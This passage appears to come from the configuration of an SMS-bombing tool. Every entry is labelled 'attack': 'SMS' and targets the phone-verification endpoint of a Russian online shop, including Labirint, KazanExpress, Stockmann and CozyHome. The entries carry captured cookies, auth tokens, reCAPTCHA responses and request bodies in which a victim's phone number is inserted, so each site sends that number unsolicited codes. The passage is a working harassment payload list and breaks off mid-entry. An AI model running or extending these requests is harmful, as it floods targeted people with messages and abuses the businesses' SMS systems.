            'cookies': {'PHPSESSID': 'q2nf304322t0kamk3oir1frns0', 'UserSes': 'labq2nf304322t0kam', 'referrer': 'http%3A%2F%2Fshare-bonus.qiwi.com%2F', 'scode': '7E00AD80-939E-4428-8703-221A06155341', 'ref_type': 'aggregator', 'admitad_uid': '6d80364bb7f1b8e7e315fbdeeb3d83fd', 'id_post': '638982', 'br_webp': '8', 'begintimed': 'MTY3OTU5NzcwMQ%3D%3D', '_gid': 'GA1.2.1411469874.1679597714', '_ym_uid': '1679597714531400634', '_ym_d': '1679597714', 'tmr_lvid': 'df4a161a5a70e42ad989cd081a40ecc4', 'tmr_lvidTS': '1679597713745', '_ga_283NG2S1HR': 'GS1.1.1679597713.1.0.1679597713.0.0.0', '_ym_isad': '1', '_ga': 'GA1.2.1723642372.1679597714', 'tmr_detect': '1%7C1679597714374', 'st_uid': 'ef96c18ae912977faaace7013a4b47c1', '_ym_visorc': 'b', '_ga_21PJ900698': 'GS1.1.1679597713.1.1.1679598085.0.0.0'},
            'headers': {'authority': 'www.labirint.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://www.labirint.ru', 'referer': 'https://www.labirint.ru/?p=2155&admitad_uid=6d80364bb7f1b8e7e315fbdeeb3d83fd&publisher_id=253174', 'sec-ch-ua': '\'Not?A_Brand\';v=\'8\', \'Chromium\';v=\'108\', \'Yandex\';v=\'23\'', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '\'Windows\'', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest'},
            'data': {'post_cl_name': 'authorization', 'post_me_name': 'sendPin', 'need_reg': '0', 'tel': number, 'by_sms': '1', '_jqpostrand': '0.05368162941787058',},
            'params': {'_jqgetrand': '0.7270480958053422',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Smallcity.su', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://smallcity.su/local/tools/phonevalidator.php',
            'cookies': {'_gcl_au': '1.1.2125586868.1679675927', '_ym_debug': 'null', '_source': 'admitad', 'PHPSESSID': 'f5vcjlv6osf4492vk79pk36j7c', '_aid': 'be8a8acd41b5e0fd1873a9e90bf86189', 'BITRIX_SM_SALE_UID': '177761067', '_ga': 'GA1.2.1428329861.1679675932', '_gid': 'GA1.2.1221396981.1679675932', '_gat_UA-47681551-1': '1', '_ym_uid': '1679675932971310231', '_ym_d': '1679675932', '_ym_isad': '1', 'rees46_session_code': 'EcJnTml31x', 'rees46_session_last_act': '1679675932810', 'rees46_device_id': 'xDlacIeKbt', 'rees46_lazy_recommenders': 'true', '_gat': '1'},
            'headers': {'authority': 'smallcity.su', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json;charset=utf-8', 'origin': 'https://smallcity.su', 'referer': 'https://smallcity.su/?utm_source=admitad&utm_medium=cpc&admitad_uid=be8a8acd41b5e0fd1873a9e90bf86189', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'mode': 'sendValidation', 'subject': f'+{number}',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'KazanExpress.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.kazanexpress.ru/api/signin/phone',
            'headers': {'authority': 'api.kazanexpress.ru', 'accept': 'application/json', 'accept-language': 'ru', 'access-content-allow-origin': '*', 'authorization': 'Basic a2F6YW5leHByZXNzLWN1c3RvbWVyOmN1c3RvbWVyU2VjcmV0S2V5', 'origin': 'https://kazanexpress.ru', 'referer': 'https://kazanexpress.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1], 'x-iid': '6b629c19-53f2-485b-93e5-8966f6dd5f6c',},
            'json': str(number)[1:],
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Stockmann.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://stockmann.ru/auth-api/register-or-login/method/phone/send-code',
            'cookies': {'_ym_uid': '1679674248492765274', '_ym_d': '1679674248', '_gcl_au': '1.1.1232330612.1679674248', 'tmr_lvid': 'e450132a9ae0a79e1645210c5215f0ff', 'tmr_lvidTS': '1679674248576', '_ym_visorc': 'b', 'anonymous_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ2YWx1ZSI6IjY0MWRjYjg5YTc3MWYwLjM4MTAzNjgxYTdjOTQ2OWRkYWVjY2E4NjQxMjYwZjdlODM2NTJhIiwidHlwZSI6IkFDQ0VTUzpBTk9OWU1PVVMiLCJpYXQiOjE2Nzk2NzQyNDl9.OGOgn2yz59GKBZv4PxfkTNm-mETg1QCqtJ_yOL4Z0ep_laPDLH0Rd7bKAzcQDlzQPytjn2WwdbcDhffLyk4NfShNIJmm2IfdhC-YX-e909fIWEn5xRF8GEAM3gK1kGc_hEGQ3Ky2Gfc8dDoGIQrbyGKqEZ_hmEZYOEixImiMUlwTRzLX2qDFtS9BUxS87C3zMEa1CQ2WGBV_aTpsAl6CZI655jrhP6F8AFnThNi5Pk1jIGXTR7YEwLao1Ah_dSxcTqVlzwwgL0UBJ6iCerQAzLbV1fK0TETnr-DSV9xxjvRyNZhDsAp5uPQ7vF080986daCyqRCsreeTY3cu1yG8CrdAuX208PRltoGRM-VSWaiqVCCbwiDur5qlM3qoGmi8Sci2c4cAdt1bx_XbwHEOxt50PyFHDhIRDGkLY7DJC4mMwkv3vWk6fOaoKqnEFidRnOGOrdAjKx9RPa7R7CA84yO2hnYTlvbjKh18PvUaZsTYnoFrbp-5gEBusAQ4xuAloXV2j0k0D6KB6My4lo4XfNQ_0NXdnoXLoX9aAKT6kitVIvqi8Rn--3tCdC6SSOlQ-q_1NpPgjzXLhbxwweA4xbEHSEY2DbnIMiHVAPIk4BkCn3JKH8xofnvoC5Ox9WKRpayqUVKcurHkL_isUrLpeARijlZjn8xe5CfqEcPVYg8', '_ym_isad': '1', 'BITRIX_SM_CITY_NAME': '%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0', 'BITRIX_SM_CITY_SALE_LOCATION_ID': '129', 'BITRIX_SM_LOCATION_GUID': '0c5b2444-70a0-4932-980c-b4dc0d3f02b5', 'BITRIX_SM_DOMAIN_ID': '1', '_gid': 'GA1.2.47416665.1679674249', 'rrpvid': '955741627482656', 'rcuid': '641dcb8a631b7e87673dee6b', 'iap.uid': '2971b7bb80b8494e8db304697c8998bc', 'flocktory-uuid': 'c4e18fce-fbc8-458b-83b1-8823b5e29069-2', 'PHPSESSID': 'ppm76sran8jq65k5b1h7n2v1mt', 'BITRIX_SM_LAST_PAGE': '%2Fimg%2Ffavicon%2Ffavicon-32x32.png', 'BITRIX_SM_PAGE_COUNTER': '0', 'BITRIX_SM_SALE_UID': '55e124d439713cbea03d2a5f5d781feb', 'tmr_detect': '1%7C1679675678681', '_ga_51M9YTC352': 'GS1.1.1679674248.1.1.1679675678.0.0.0', '_ga': 'GA1.2.296008952.1679674248', '_gat_UA-75724517-1': '1', 'rr-testCookie': 'testvalue'},
            'headers': {'authority': 'stockmann.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://stockmann.ru', 'referer': 'https://stockmann.ru/personal/login/?backUrl=/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-auth-token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ2YWx1ZSI6IjY0MWRjYjg5YTc3MWYwLjM4MTAzNjgxYTdjOTQ2OWRkYWVjY2E4NjQxMjYwZjdlODM2NTJhIiwidHlwZSI6IkFDQ0VTUzpBTk9OWU1PVVMiLCJpYXQiOjE2Nzk2NzQyNDl9.OGOgn2yz59GKBZv4PxfkTNm-mETg1QCqtJ_yOL4Z0ep_laPDLH0Rd7bKAzcQDlzQPytjn2WwdbcDhffLyk4NfShNIJmm2IfdhC-YX-e909fIWEn5xRF8GEAM3gK1kGc_hEGQ3Ky2Gfc8dDoGIQrbyGKqEZ_hmEZYOEixImiMUlwTRzLX2qDFtS9BUxS87C3zMEa1CQ2WGBV_aTpsAl6CZI655jrhP6F8AFnThNi5Pk1jIGXTR7YEwLao1Ah_dSxcTqVlzwwgL0UBJ6iCerQAzLbV1fK0TETnr-DSV9xxjvRyNZhDsAp5uPQ7vF080986daCyqRCsreeTY3cu1yG8CrdAuX208PRltoGRM-VSWaiqVCCbwiDur5qlM3qoGmi8Sci2c4cAdt1bx_XbwHEOxt50PyFHDhIRDGkLY7DJC4mMwkv3vWk6fOaoKqnEFidRnOGOrdAjKx9RPa7R7CA84yO2hnYTlvbjKh18PvUaZsTYnoFrbp-5gEBusAQ4xuAloXV2j0k0D6KB6My4lo4XfNQ_0NXdnoXLoX9aAKT6kitVIvqi8Rn--3tCdC6SSOlQ-q_1NpPgjzXLhbxwweA4xbEHSEY2DbnIMiHVAPIk4BkCn3JKH8xofnvoC5Ox9WKRpayqUVKcurHkL_isUrLpeARijlZjn8xe5CfqEcPVYg8',},
            'json': {'phone': int(number),},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'EKONIKA.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://ekonika.ru/ajax/send_pin.php',
            'cookies': {'qrator_jsr': '1679737204.413.jmlnhKkXmFw7TPEK-dd3vn70qvhkebt9mm26nbid296adekh1-00', 'qrator_ssid': '1679737205.296.wEhg3A1zNCC5m5Ue-llemasghohm0gaagqaid25hvbiuhd6g2', 'qrator_jsid': '1679737204.413.jmlnhKkXmFw7TPEK-u1stion95huu9mn9jrol3q0glvjsljol', 'PHPSESSID': 'jTtujpmSpaSc0OVUCBw1axXZdgv9XcfS', 'BITRIX_SM_SALE_UID': '172531156', 'deduplication_cookie': 'epn_cashback', '_gcl_au': '1.1.375606042.1679737210', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1679777940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', 'BX_USER_ID': '1d6944ae099d309c71c2c50e6a5d7baa', 'mindboxDeviceUUID': '4ae962d9-3a17-451a-901f-7353ac3efcc5', 'directCrm-session': '%7B%22deviceGuid%22%3A%224ae962d9-3a17-451a-901f-7353ac3efcc5%22%7D', 'adtech_uid': '900da5b8-c8ad-4e02-9096-153b44e54ef1%3Aekonika.ru', 'top100_id': 't1.7643190.868128559.1679737210432', 'last_visit': '1679719210435%3A%3A1679737210435', 't3_sid_7643190': 's1.1204112136.1679737210433.1679737210611.1.2', 'tmr_lvid': 'd25e30a4330670e4c0c6981c6a34f62c', 'tmr_lvidTS': '1679737210764', '_userGUID': '0:lfns5yz9:zVWKXSU5Op8UHwNuG3hg60iSmD3wvAtP', 'dSesn': 'de73bb68-7783-d3b7-0559-7161830c8f19', '_dvs': '0:lfns5yz9:1DeTVldFWRgcEPFrS7NsH1mT4uOoStYU', '_ym_uid': '1679737211255299957', '_ym_d': '1679737211', '_ym_isad': '1', '_gid': 'GA1.2.1295857609.1679737211', '_ga': 'GA1.1.1117549916.1679737211', 'tt_deduplication_cookie': 'epn_cashback', '_ym_visorc': 'b', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '__exponea_etc__': '4b03f5d2-57b1-441b-af17-0678bbe81571', '__exponea_time2__': '0.20795202255249023', 'tmr_detect': '0%7C1679737216175', '_ga_7NNZ59QE8F': 'GS1.1.1679737211.1.0.1679737354.60.0.0'},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://ekonika.ru', 'Referer': 'https://ekonika.ru/?utm_source=epn_cashback&utm_medium=cpa&utm_campaign=4345726&utm_content=46rs2lisanl3n3esfqkmad51sctrmu27&utm_referrer=https%3A%2F%2Fgoodsbuy.by%2F', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'code': ' 7', 'phone': str(number)[1:], 'action': 'check_phone', 'sessid': '12aa180c16faffec160d6e69f4b8d09a',},
            'params': {'site': 's1', 'type': 'login.web',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'CozyHome.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://cozyhome.ru/local/rest/front/user/login-or-register/',
            'cookies': {'PHPSESSID': 'xyI33teGGuM6mnhPKXtXcYiUZvyyZCD7', 'visited': 'true', 'BITRIX_SM_GUEST_ID': '18724798', 'advcake_session_id': 'cce8c4fb-41a2-3d93-3b65-45e82d130d1c', 'advcake_track_url': 'https%3A%2F%2Fcozyhome.ru%2F%3Futm_source%3Depnbz%26utm_medium%3Dcpa%26utm_campaign%3D4345726%26advcake_params%3D45rs2kgogptnjy12dq6ox565k0x1y9y4', 'advcake_utm_partner': 'epnbz', 'advcake_utm_webmaster': '4345726', 'advcake_click_id': '45rs2kgogptnjy12dq6ox565k0x1y9y4', 'tmr_lvid': '81a89251bec6bc6a88a8419547729417', 'tmr_lvidTS': '1679735870461', '_gid': 'GA1.2.882402860.1679735872', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', 'admitad_deduplication_cookie': 'epnbz', '_ym_uid': '1679735908796330732', '_ym_d': '1679735908', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1679777940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', 'adspire_uid': 'AS.727518628.1679735908', 'catalog_view_mode': 'compact', '_ym_isad': '1', 'BX_USER_ID': 'e55ad8bf7a9de4cb4bfcf788681487e2', '_ym_visorc': 'w', 'mindboxDeviceUUIDSendCart': '3549377e-4dfd-4efa-9f2c-77bc4ef969d7', 'tt_deduplication_cookie': 'epnbz', '_ga_YTVC0YEM32': 'GS1.1.1679735871.1.1.1679736441.0.0.0', '_ga': 'GA1.2.1563798632.1679735872', '_gat_UA-101037734-1': '1', 'advcake_track_id': '047939ec-b975-410b-f637-29e86f42eb63', 'user_region_data': '%7B%22id%22%3A%22%22%2C%22city%22%3A%22%5Cu0413%5Cu043b%5Cu0430%5Cu0437%5Cu043e%5Cu0432%22%2C%22city_with_type%22%3A%22%5Cu0423%5Cu0434%5Cu043c%5Cu0443%5Cu0440%5Cu0442%5Cu0441%5Cu043a%5Cu0430%5Cu044f%20%5Cu0420%5Cu0435%5Cu0441%5Cu043f%2C%20%5Cu0433%20%5Cu0413%5Cu043b%5Cu0430%5Cu0437%5Cu043e%5Cu0432%22%2C%22city_unrestricted%22%3A%22427620%2C%20%5Cu0423%5Cu0434%5Cu043c%5Cu0443%5Cu0440%5Cu0442%5Cu0441%5Cu043a%5Cu0430%5Cu044f%20%5Cu0420%5Cu0435%5Cu0441%5Cu043f%2C%20%5Cu0433%20%5Cu0413%5Cu043b%5Cu0430%5Cu0437%5Cu043e%5Cu0432%22%2C%22code%22%3A%22%22%2C%22geo_lat%22%3A%2258.135907%22%2C%22geo_lon%22%3A%2252.663446%22%2C%22confirmed%22%3A1%2C%22region_hash%22%3A%22b7c452728e1895f5b54d2fcc629ad6eb%22%2C%22region_code%22%3A%22im%22%7D', 'BITRIX_SM_LAST_VISIT': '25.03.2023%2012%3A27%3A21', 'BITRIX_SM_USER_UNIQ_ID': '5cd118d0f5dc0c008cdb9977dfe93cd5', 'atm_closer': '%7B%22id%22%3A13566%2C%22mid%22%3A20777%2C%22aid%22%3A%22AS.727518628.1679735908%22%2C%22cookie_time%22%3A1679736443952%2C%22priority%22%3A0%2C%22webid%22%3A%224345726%22%2C%22uid%22%3A%2245rs2kgogptnjy12dq6ox565k0x1y9y4%22%7D', 'tmr_detect': '1%7C1679736444070', 'mindboxDeviceUUID': '3549377e-4dfd-4efa-9f2c-77bc4ef969d7', 'directCrm-session': '%7B%22deviceGuid%22%3A%223549377e-4dfd-4efa-9f2c-77bc4ef969d7%22%7D'},
            'headers': {'authority': 'cozyhome.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://cozyhome.ru', 'referer': 'https://cozyhome.ru/?utm_source=epnbz&utm_medium=cpa&utm_campaign=4345726&advcake_params=45rs2kgogptnjy12dq6ox565k0x1y9y4', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'step=init&phone={number}&recaptcha-response=03AKH6MRHBVDPqv8GG6PtdauEHrjCZdwTo_KEeRiglGgxasqmdu1weh5r8dfXjkas3KxA-TixKPmz9eecMICxV7ZstiJ80cwtEXuvwaB_nxeilkzn2rFdar8HiUwkhBPVM8m6v7PDItwrKdirqBHEKKT3toy8r6ag3DG2a973KEZNcsyRRlamWCGPh97viEJ_yx33ot9pWPq_OnWHwEY9juIXDcQMEgY9E8jCTfzBpbiccAxiotr1EiREB73a0BVu95Un7UmqEdHZGP4VUG1amBwlURjC6KjotYnGvmRxqIM0RFcGY8mUiX18GcE9JqwrAUIcDa86Mz_zdllgDsDK-K1dH5x1pTfFItDD6cHsVkU2YvMyV8h-odRaEyA2ZAuznHG-fnVxEORinjnIsoowvUTAUrKIrH1ECmGieYzU9x7_tlfAhquxSQcrAZlZyshJLpOkjbB-kqz12jTkQQXlXGC9HojHyu8_TWKNFmQaalr18rhPjN9RK0JG8HRMTTtnWApNNqCAtdBZY&session=fed4e6875e134fa64386e339dc6e8796',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Bethowen.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.bethowen.ru/local/ajax/new-reg/new-reg-auth-get-code.php',
            'cookies': {'PHPSESSID': '1j7o3ma09grnt3qdobqtl1dqh0', 'BETHOWEN_GEO_TOWN': '%D0%93%D0%BB%D0%B0%D0%B7%D0%BE%D0%B2', 'BETHOWEN_GEO_TOWN_ID': '150257', 'BETHOWEN_GEO_REGION_ID': '47', 'BETHOWEN_GEO_REGION': '%D0%A3%D0%B4%D0%BC%D1%83%D1%80%D1%82%D1%81%D0%BA%D0%B0%D1%8F', 'IS_AUTHORIZED_USER': 'N', 'BITRIX_SM_advcake_trackid': '72f64c7b4a19fa34f1dd17a3c4898f66', 'BITRIX_SM_advcake_url': '%2F%3Fadvcake_params%3D46rs2ivmwiye124iu23ej4ezx2t0ylp2%26utm_source%3Dadvcake%26utm_medium%3Dcpa%26utm_campaign%3Depn%26utm_content%3D4345726', 'BITRIX_SM_CPA_LASTCOOKIE': 'ADV_CAKE_UID', 'BITRIX_SM_SALE_UID': '60f34e2e6497c668a9f4a4e2d0347692', '_ym_uid': '1679733805781900139', '_ym_d': '1679733805', '_gid': 'GA1.2.1527164835.1679733805', '_gat_UA-74359728-1': '1', 'tmr_lvid': '9ef5dea4ceab21426299d4544e1d5976', 'tmr_lvidTS': '1679733805282', '_ym_visorc': 'w', '_ga_XV397Q6BXS': 'GS1.1.1679733805.1.0.1679733805.60.0.0', '_ga_05BC0PH6PR': 'GS1.1.1679733805.1.0.1679733805.60.0.0', '_ga_DD0749TTTB': 'GS1.1.1679733805.1.0.1679733805.60.0.0', 'flocktory-uuid': 'ce2eeca7-349b-445f-b7a9-fd67aea930d0-0', '_userGUID': '0:lfnq4zl2:kiyfSfIV6tGO0OHGUWJ09zIC9Kx7auMq', 'dSesn': '61e3f5d4-8ef5-16dd-e449-a2dc0c2c9e40', '_dvs': '0:lfnq4zl2:2P9HOwKZ7kwFI~jMR_ZLsn~jYt09QL~~', '_gcl_au': '1.1.741551525.1679733806', '_ym_debug': 'null', '_ym_isad': '1', 'advcake_last_utm': 'advcake', 'advcake_url': 'https%3A%2F%2Fwww.bethowen.ru%2F%3Fadvcake_params%3D46rs2ivmwiye124iu23ej4ezx2t0ylp2%26utm_source%3Dadvcake%26utm_medium%3Dcpa%26utm_campaign%3Depn%26utm_content%3D4345726', 'advcakeUrl': 'https%3A%2F%2Fwww.bethowen.ru%2F%3Fadvcake_params%3D46rs2ivmwiye124iu23ej4ezx2t0ylp2%26utm_source%3Dadvcake%26utm_medium%3Dcpa%26utm_campaign%3Depn%26utm_content%3D4345726', 'user_unic_ac_id': '72896c7c-6797-44ec-5133-726846aa8041', 'advcake_session': '1', 'advcake_utm_content': '4345726', 'advcake_utm_campaign': 'epn', 'advcake_utm_source': 'advcake', 'advcake_params': '46rs2ivmwiye124iu23ej4ezx2t0ylp2', '_ga': 'GA1.2.946445538.1679733805', '_gat_gtag_UA_74359728_1': '1', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', 'BX_USER_ID': '05a748676ec73f27dcb72e20a37b60a4', 'aprt_last_partner': 'actionpay', 'aprt_last_apclick': '', 'aprt_last_apsource': '4345726', 'tmr_detect': '1%7C1679733807397', 'iwaf_fingerprint': 'c56f88bf0430a376b657e5a89908cdb3', 'mindboxDeviceUUID': '7049e328-8733-4766-9ae0-fe01247fcd70', 'directCrm-session': '%7B%22deviceGuid%22%3A%227049e328-8733-4766-9ae0-fe01247fcd70%22%7D', 'activity': '4|20', 'iwaf_click_event': '614x413'},
            'headers': {'authority': 'www.bethowen.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://www.bethowen.ru', 'referer': 'https://www.bethowen.ru/?advcake_params=46rs2ivmwiye124iu23ej4ezx2t0ylp2&utm_source=advcake&utm_medium=cpa&utm_campaign=epn&utm_content=4345726', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'data': number, 'recaptcha_response': '03AKH6MRE_ijBgglt_d2Yqh6iI_gl4p4D264-ehrnNslpsKsk55ngfVoDck1vd23ZzYu9t-S4QzkgHCSNhfHyBR_zteAQMpNpVYQIgZo7ZIUc-Bmqe7UTyV4YeAqAiZaaLUycZ6_23Zxw1LT7YU_49i5T92QznwBkPDLxP1RKalfZXivVfPYyySlq2NZdQ-Zxn3bAd8i1MbGvoKdTlTKpLR4Jh0mfs3iv7ZJHJ6BkLnYAMB-8Bn_igFlTv01A02vFVcWjDLxAXxylDnUpwYpzk80nfSziHEQRRnjvsc07FRSeiq89qfihEanLYFuhdK6Rbu_2cTxpncoQWGOT-Fn2bTFLfeVbQP5XOSgrVHbgU881Ss3DGIP4qOp0GkIBGh6jwVli-nUal34nmrUqT3M7uKbOfm5GcpI6aEOm7tagoP-R2qhP-3J_tJ4l-a3gP9R-AaRDiAWS3TeZ612OmTtGBhMgVtw9kPG2YvNdc4QuXgt6tWY8bl9q81MEO0DUJXf86qsCOkI7CGIdU', 'ver': 'v3',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Podrygka.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.podrygka.ru/ajax/phone_confirm_code_validate.php',
            'cookies': {'flocktory-uuid': '38f9be36-d30b-4027-bdfc-502669218826-8', '_gcl_au': '1.1.911444722.1679734600', 'rrpvid': '101261192302280', 'rcuid': '641eb7482c7401205029dba8', 'tmr_lvid': 'f14d2e205c20dff18da05a44619cae7a', 'tmr_lvidTS': '1679734600272', '_ym_uid': '1679734601126171430', '_ym_d': '1679734601', '_gid': 'GA1.2.408939463.1679734601', '_ym_visorc': 'b', '_userGUID': '0:lfnqm1h0:JMu0uRAuf7hjQ3hNAmcwqJtwykLdZkAq', 'dSesn': 'e5547efe-cf1f-6e19-ff9a-1484ca2dab47', '_dvs': '0:lfnqm1h0:D9eP_HAQoaaKr7OsAqftxLPTt00XRYbo', 'PHPSESSID': '963fbce8be103d1ddee2cf2b111eac2e', '_ga_PNTGGG08RK': 'GS1.1.1679734601.1.1.1679734603.58.0.0', 'BITRIX_SM_utm_source': 'admitad', 'BITRIX_SM_utm_medium': 'cpa', 'BITRIX_SM_utm_campaign': 'webmasters', 'BITRIX_SM_utm_term': '253174', 'BITRIX_SM_admitad_uid': '19b1e9c64c0fc6ab7987c8f47299eb5f', '_aid': '19b1e9c64c0fc6ab7987c8f47299eb5f', '_ga': 'GA1.2.764149990.1679734601', 'BITRIX_SM_SALE_UID': '1084070042', '_ym_isad': '1', 'tmr_detect': '1%7C1679734604203', 'uxs_uid': '0e5e74b0-caeb-11ed-a432-f7787c6754c6', '_dc_gtm_UA-46690290-1': '1'},
            'headers': {'authority': 'www.podrygka.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryoPwY3U6P9a8v2Bmf', 'origin': 'https://www.podrygka.ru', 'referer': 'https://www.podrygka.ru/?utm_source=admitad&utm_medium=cpa&utm_campaign=webmasters&webid=253174&admitad_uid=19b1e9c64c0fc6ab7987c8f47299eb5f&utm_term=253174', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'------WebKitFormBoundaryoPwY3U6P9a8v2Bmf\r\nContent-Disposition: form-data; name="redirectURL"\r\n\r\n\r\n------WebKitFormBoundaryoPwY3U6P9a8v2Bmf\r\nContent-Disposition: form-data; name="repeat_password"\r\n\r\nTGSGsfsudfyh4e6e5\r\n------WebKitFormBoundaryoPwY3U6P9a8v2Bmf\r\nContent-Disposition: form-data; name="recaptcha_token"\r\n\r\n03AKH6MRGfHdt3VC67dogsIM6PVgMullUclbSsZFkmLBqTTyMQi3_Ws30YxlrztU0UyHT2w96K2HujOmzAKrGeV8xivEo_bz1yKY2Iza7lHj2RHNyw1fqhfWEeUOznMYyPuFplH7lZ8IR5CcHjRRkFYPPOWc2Qt0UDK_jV_0G2xOEGhTlXVUOPDYBkDNq1P3CX2wgLlhsUZjMTA5CphhPrVhOrWQITMz8FmwI9HQEL0Shr9CcliNpjOXaVfCtJpLlNozzgFAQnGoxtYaOrlZKvodmhKrKGTnI1GRM9bTUiwc3c6jALJuYZScxYfX2EviukLHNOsdCeIIc7xwWqLr0v-_Xd0k1G2JWjHaAI3j2uDsTQWaFqL_Blad7wf1h0clNTjMWzFXDDH6S40KYEy5pKHATygzTdUPf5A7QmHwjA3W2ooRbVzoU-W1VjITstdrCFcjk_J6MlTzmep6KAiuq00z_n59oi35VrZJV8RVt74JDIxLWz5oIXqbjK3lWjgeFct_HYidIsV9UhkGFN_f4BsQZtLl01KRIy9g\r\n------WebKitFormBoundaryoPwY3U6P9a8v2Bmf\r\nContent-Disposition: form-data; name="sessid"\r\n\r\n42e4142ff3a8074dfd30db16ac32eb94\r\n------WebKitFormBoundaryoPwY3U6P9a8v2Bmf\r\nContent-Disposition: form-data; name="first_name"\r\n\r\nUser\r\n------WebKitFormBoundaryoPwY3U6P9a8v2Bmf\r\nContent-Disposition: form-data; name="last_name"\r\n\r\n \r\n------WebKitFormBoundaryoPwY3U6P9a8v2Bmf\r\nContent-Disposition: form-data; name="email"\r\n\r\n{email()}\r\n------WebKitFormBoundaryoPwY3U6P9a8v2Bmf\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+{number}\r\n------WebKitFormBoundaryoPwY3U6P9a8v2Bmf\r\nContent-Disposition: form-data; 